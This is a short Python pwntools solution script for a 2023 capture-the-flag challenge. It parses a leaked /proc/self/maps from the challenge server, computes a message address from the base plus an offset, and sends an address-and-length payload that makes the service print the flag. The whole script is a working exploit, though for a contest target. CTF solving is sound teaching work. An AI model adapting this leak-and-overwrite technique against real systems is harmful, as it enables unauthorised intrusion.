from pwn import *
import re
import time

overwrite_length = 40

p = remote("wfw1.2023.ctfcompetition.com", 1337)

time.sleep(5)

## Get leaked /proc/self/maps
address_leak = p.recv()

## Get leaked base addresses
base_address_list = re.findall(b'(\w{12})-', address_leak)

## Get first leaked base address
base_address = int(base_address_list[0], 16)
print("Leaked base address: {0}".format(hex(base_address)))

## Message offset ("And I'll write it wherever you want it to go.") from main
offset = int("0x21e0", 16)
print("Message offset: {0}".format(hex(offset)))

## Get message address (leaked base address (main address) + offset)
message_address = hex(base_address + offset)
print("Message address (base address + offset): {0}".format(message_address))

## Build payload (address, length)
payload = "{0} {1}".format(message_address, overwrite_length).encode()
print("Payload: {0}".format(payload.decode()))

## Send payload
p.sendline(payload)

time.sleep(2)

## Get and print flag
overwritten_message = p.recv()
flag = re.findall(b'CTF{.*}', overwritten_message)
print("Flag: {0}".format(flag[0].decode()))

p.close()
